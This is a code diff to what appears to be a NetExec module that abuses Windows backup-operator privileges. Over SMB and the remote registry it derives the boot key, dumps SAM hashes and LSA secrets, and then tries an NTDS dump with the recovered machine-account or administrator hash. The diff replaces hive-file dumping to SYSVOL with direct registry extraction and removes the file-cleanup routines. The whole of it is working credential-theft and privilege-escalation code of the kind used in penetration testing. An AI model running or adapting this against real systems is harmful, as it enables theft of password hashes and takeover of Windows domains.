@@ -1,14 +1,51 @@
 import contextlib
 import re
+from binascii import unhexlify
 
-from impacket.examples.secretsdump import SAMHashes, LSASecrets, LocalOperations
-from impacket.smbconnection import SessionError
 from impacket.dcerpc.v5 import rrp
+from impacket.examples.secretsdump import SAMHashes, LSASecrets, LocalOperations
+from impacket.examples.regsecrets import (
+    RemoteOperations as RegSecretsRemoteOperations,
+    SAMHashes as RegSecretsSAMHashes,
+    LSASecrets as RegSecretsLSASecrets,
+)
 from nxc.helpers.misc import CATEGORY, gen_random_string
-from nxc.helpers.rpc import NXCRPCConnection
 
 TEMP_DIR = "C:\\Windows\\Temp"
-SYSVOL_DIR = "C:\\Windows\\sysvol\\sysvol"
+
+
+class BackupOperatorRemoteOperations(RegSecretsRemoteOperations):
+    """regsecrets RemoteOperations without the SCMR service handling: its
+    status check opens the service manager and the RemoteRegistry service
+    with rights a backup operator does not have. Opening the winreg pipe
+    trigger-starts the service instead, so only the bind is needed.
+    """
+
+    def enableRegistry(self):
+        self._RemoteOperations__connectWinReg()
+
+    def getBootKey(self):
+        # regsecrets opens the Lsa class keys without backup intent, which
+        # is denied to a backup operator: SeBackupPrivilege covers the
+        # backup-intent open instead
+        boot_key = b""
+        self.openHKLMHandle()
+        for key in ["JD", "Skew1", "GBG", "Data"]:
+            ans = rrp.hBaseRegOpenKey(
+                self._RemoteOperations__rrp,
+                self._RemoteOperations__regHandle,
+                f"SYSTEM\\CurrentControlSet\\Control\\Lsa\\{key}",
+                dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK,
+                samDesired=rrp.KEY_READ,
+            )
+            key_handle = ans["phkResult"]
+            info = rrp.hBaseRegQueryInfoKey(self._RemoteOperations__rrp, key_handle)
+            boot_key += info["lpClassOut"][:-1].encode("utf-8")
+            rrp.hBaseRegCloseKey(self._RemoteOperations__rrp, key_handle)
+
+        boot_key = unhexlify(boot_key)
+        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
+        return bytes(boot_key[transforms[i]] for i in range(len(boot_key)))
 
 
 class NXCModule:
@@ -43,69 +80,83 @@ class BackupOperator:
         self.local_admin_hash = None
         self.machine_account = None
         self.machine_account_hash = None
-        self.cleanup_user = None
-        self.cleanup_hash = None
+
+    def _parse_sam_secret(self, secret):
+        self.context.log.highlight(secret)
+        if not self.local_admin:
+            first_line = secret.strip().splitlines()[0]
+            fields = first_line.split(":")
+            if len(fields) >= 4:
+                self.local_admin = fields[0]
+                self.local_admin_hash = fields[3]
+
+    def _parse_lsa_secret(self, secret_type, secret):
+        self.context.log.highlight(secret)
+        if self.machine_account:
+            return
+        for line in secret.splitlines():
+            match = re.search(r"aad3b435b51404eeaad3b435b51404ee:([0-9a-f]{32})", line, re.IGNORECASE)
+            if match:
+                self.machine_account_hash = match.group(1)
+                account_name = line.split(":", 1)[0].strip().split("\\")[-1]
+                # "$MACHINE.ACC" has no real name -> derive it from the connection.
+                self.machine_account = account_name if account_name.endswith("$") else f"{self.connection.hostname}$"
+                return
 
     def _parse_local_hives(self, log_path, skip_lsa=False):
         try:
-            def parse_sam(secret):
-                self.context.log.highlight(secret)
-                if not self.local_admin:
-                    first_line = secret.strip().splitlines()[0]
-                    fields = first_line.split(":")
-                    if len(fields) >= 4:
-                        self.local_admin = fields[0]
-                        self.local_admin_hash = fields[3]
-
-            def parse_lsa(secret_type, secret):
-                self.context.log.highlight(secret)
-                if self.machine_account:
-                    return
-                for line in secret.splitlines():
-                    match = re.search(r"aad3b435b51404eeaad3b435b51404ee:([0-9a-f]{32})", line, re.IGNORECASE)
-                    if match:
-                        self.machine_account_hash = match.group(1)
-                        account_name = line.split(":", 1)[0].strip().split("\\")[-1]
-                        # "$MACHINE.ACC" has no real name -> derive it from the connection.
-                        self.machine_account = account_name if account_name.endswith("$") else f"{self.connection.hostname}$"
-                        return
-
             local_operations = LocalOperations(log_path + "SYSTEM")
             boot_key = local_operations.getBootKey()
-            sam_hashes = SAMHashes(log_path + "SAM", boot_key, isRemote=False, perSecretCallback=parse_sam)
+            sam_hashes = SAMHashes(log_path + "SAM", boot_key, isRemote=False, perSecretCallback=self._parse_sam_secret)
             sam_hashes.dump()
             sam_hashes.finish()
 
             if not skip_lsa:
-                lsa_secrets = LSASecrets(log_path + "SECURITY", boot_key, None, isRemote=False, perSecretCallback=parse_lsa)
+                lsa_secrets = LSASecrets(log_path + "SECURITY", boot_key, None, isRemote=False, perSecretCallback=self._parse_lsa_secret)
                 lsa_secrets.dumpCachedHashes()
                 lsa_secrets.dumpSecrets()
         except Exception as e:
             self.context.log.fail(f"Fail to dump the sam and lsa: {e!s}")
 
-    def _print_cleanup_warning(self, rand_suffix):
-        self.context.log.fail(f"Files were not automatically deleted. Please clean up manually: {self.CLEANUP_DIR}\\SECURITY_{rand_suffix}, SAM_{rand_suffix}, SYSTEM_{rand_suffix}")
-
 
 class BackupOperator_Smb(BackupOperator):
-    CLEANUP_DIR = SYSVOL_DIR
+    def run(self):
+        # The regsecrets extraction walks the hives with backup-intent opens
+        # and registry queries: no RegSaveKey, no hive file dropped on the
+        # target, the backup operator SeBackupPrivilege covers it all.
+        # Local backup operators only work with LocalAccountTokenFilterPolicy
+        # set on the target: the UAC-filtered network token of a local
+        # account drops SeBackupPrivilege, domain accounts are not filtered.
+        context = self.context
+        context.log.display("Dumping SAM and LSA secrets through the registry...")
+        # open the winreg pipe so the trigger-started RemoteRegistry spins
+        # up without any service rights: enableRegistry would otherwise try
+        # to start it through SCMR, which a backup operator cannot
+        self.connection.trigger_winreg()
+        remote_ops = None
+        try:
+            remote_ops = BackupOperatorRemoteOperations(self.connection.conn, self.connection.kerberos, self.connection.kdcHost)
+            remote_ops.enableRegistry()
+            bootkey = remote_ops.getBootKey()
 
-    def _ntds_then_cleanup(self, rand_suffix, candidates):
-        """Try the NTDS dump with each candidate, then clean the dump files
-        with the best credentials we ended up with.
-        """
-        dump_creds = None
-        for username, user_hash in candidates:
+            sam = RegSecretsSAMHashes(bootkey, remoteOps=remote_ops, perSecretCallback=self._parse_sam_secret)
+            sam.dump()
+            lsa = RegSecretsLSASecrets(bootkey, remoteOps=remote_ops, perSecretCallback=self._parse_lsa_secret)
+            lsa.dumpCachedHashes()
+            lsa.dumpSecrets()
+        except Exception as e:
+            context.log.fail(f"Fail to dump the sam and lsa: {e!s}")
+            return
+        finally:
+            if remote_ops is not None:
+                with contextlib.suppress(Exception):
+                    remote_ops.finish()
+
+        # The machine account can DCSync, the RID 500 hash is the local
+        # (domain on a DC) administrator
+        for username, user_hash in [(self.machine_account, self.machine_account_hash), (self.local_admin, self.local_admin_hash)]:
             if self._try_dump_ntds(username, user_hash):
-                dump_creds = (username, user_hash)
                 break
-
-        if dump_creds:
-            self.cleanup_user, self.cleanup_hash = self._extract_da_hash()
-            if not self.cleanup_user or not self.cleanup_hash:
-                self.cleanup_user, self.cleanup_hash = dump_creds
-
-        self._perform_cleanup(rand_suffix)
 
     def _try_dump_ntds(self, username, user_hash):
         if not username or not user_hash:
@@ -121,122 +172,6 @@ class BackupOperator_Smb(BackupOperator):
             except Exception as e:
                 self.context.log.fail(f"Fail to dump the NTDS with {username}: {e!s}")
         return False
-
-    def _perform_cleanup(self, rand_suffix):
-        if not self.cleanup_user or not self.cleanup_hash:
-            self.context.log.fail("Failed to obtain suitable credentials for NTDS dump or cleanup.")
-            self._print_cleanup_warning(rand_suffix)
-            return
-
-        self.context.log.display(f"Using {self.cleanup_user} to clean up files...")
-        with contextlib.suppress(Exception):
-            self.connection.conn.logoff()
-        self.connection.create_conn_obj()
-        if self.connection.hash_login(self.connection.domain, self.cleanup_user, self.cleanup_hash) and self._delete_dump_files(rand_suffix):
-            self.context.log.display("Successfully deleted dump files !")
-            return
-        self._print_cleanup_warning(rand_suffix)
-
-    def _extract_da_hash(self):
-        try:
-            with open(f"{self.connection.output_filename}.ntds") as f:
-                fallback = None
-                for line in f:
-                    fields = line.strip().split(":")
-                    if len(fields) < 4 or not fields[3]:
-                        continue
-                    da_user = fields[0].split("\\")[-1] if "\\" in fields[0] else fields[0]
-                    if fields[1] == "500":
-                        return da_user, fields[3]
-                    if fallback is None:
-                        fallback = (da_user, fields[3])
-                if fallback:
-                    return fallback
-        except Exception as e:
-            self.context.log.debug(f"Failed to read NTDS file for cleanup: {e}")
-        return None, None
-
-    def run(self):
-        rand_suffix = gen_random_string(8)
-        log_path = f"{self.connection.output_filename}."
-        self.connection.args.share = "SYSVOL"
-
-        # enable remote registry
-        self.context.log.display("Triggering RemoteRegistry to start through named pipe...")
-        self.connection.trigger_winreg()
-        dce = NXCRPCConnection(self.connection).connect(r"\winreg", rrp.MSRPC_UUID_RRP)
-
-        try:
-            for hive in ["HKLM\\SAM", "HKLM\\SYSTEM", "HKLM\\SECURITY"]:
-                hRootKey, subKey = self._strip_root_key(dce, hive)
-                outputFileName = f"\\\\{self.connection.host}\\SYSVOL\\{subKey}_{rand_suffix}"
-                self.context.log.debug(f"Dumping {hive}, be patient it can take a while for large hives (e.g. HKLM\\SYSTEM)")
-                try:
-                    ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK, samDesired=rrp.KEY_READ)
-                    rrp.hBaseRegSaveKey(dce, ans2["phkResult"], outputFileName)
-                    self.context.log.highlight(f"Saved {hive} to {outputFileName}")
-                except Exception as e:
-                    self.context.log.fail(f"Couldn't save {hive}: {e} on path {outputFileName}")
-                    self._print_cleanup_warning(rand_suffix)
-                    return
-        except (Exception, KeyboardInterrupt) as e:
-            self.context.log.fail(f"Unexpected error: {e}")
-            return
-        finally:
-            with contextlib.suppress(Exception):
-                dce.disconnect()
-
-        # copy remote file to local
-        try:
-            for hive in self.HIVES:
-                self.connection.get_file_single(f"{hive}_{rand_suffix}", log_path + hive)
-        except Exception as e:
-            self.context.log.fail(f"Couldn't fetch the hives: {e!s}")
-            self._print_cleanup_warning(rand_suffix)
-            return
-
-        self._parse_local_hives(log_path)
-        self._ntds_then_cleanup(rand_suffix, [(self.machine_account, self.machine_account_hash), (self.local_admin, self.local_admin_hash)])
-
-    def _delete_dump_files(self, rand_suffix):
-        self.context.log.display(f"Cleaning dump with user {self.cleanup_user} on domain {self.connection.domain}")
-        all_deleted = True
-        for hive in self.HIVES:
-            remote_name = f"{hive}_{rand_suffix}"
-            try:
-                self.connection.conn.deleteFile("SYSVOL", remote_name)
-                self.context.log.debug(f"File {remote_name} deleted successfully via SMB.")
-            except SessionError as e:
-                if "STATUS_NO_SUCH_FILE" in str(e):
-                    self.context.log.debug(f"File {remote_name} already removed or not found.")
-                    continue
-                if "STATUS_ACCESS_DENIED" in str(e):
-                    self.context.log.debug(f"SMB deleteFile for {remote_name} got access denied. Attempting deletion via cmd execution...")
-                    try:
-                        self.connection.execute(f"del {SYSVOL_DIR}\\{remote_name}")
-                        continue
-                    except Exception as exec_err:
-                        self.context.log.debug(f"Failed to delete {remote_name} via command execution: {exec_err}")
-                all_deleted = False
-                self.context.log.fail(f"Fail to remove the file {remote_name}: {e!s}")
-
-        if not all_deleted:
-            return False
-        for hive in self.HIVES:
-            remote_name = f"{hive}_{rand_suffix}"
-            try:
-                if self.connection.conn.listPath("SYSVOL", remote_name):
-                    self.context.log.fail(f"File {remote_name} still exists on {SYSVOL_DIR}\\{remote_name}")
-                    return False
-            except SessionError:
-                pass
-        return True
-
-    def _strip_root_key(self, dce, key_name):
-        sub_key = "\\".join(key_name.split("\\")[1:])
-        ans = rrp.hOpenLocalMachine(dce)
-        h_root_key = ans["phKey"]
-        return h_root_key, sub_key
 
 
 class BackupOperator_WinRM(BackupOperator):
@@ -293,3 +228,6 @@ class BackupOperator_WinRM(BackupOperator):
         files = " ".join(f"{TEMP_DIR}\\{hive}_{rand_suffix}" for hive in self.HIVES)
         leftover = self.connection.ps_execute(f"cmd /c 'del {files} 2>nul & dir /b {files} 2>nul'", True) or ""
         return not leftover.strip()
+
+    def _print_cleanup_warning(self, rand_suffix):
+        self.context.log.fail(f"Files were not automatically deleted. Please clean up manually: {self.CLEANUP_DIR}\\SECURITY_{rand_suffix}, SAM_{rand_suffix}, SYSTEM_{rand_suffix}")
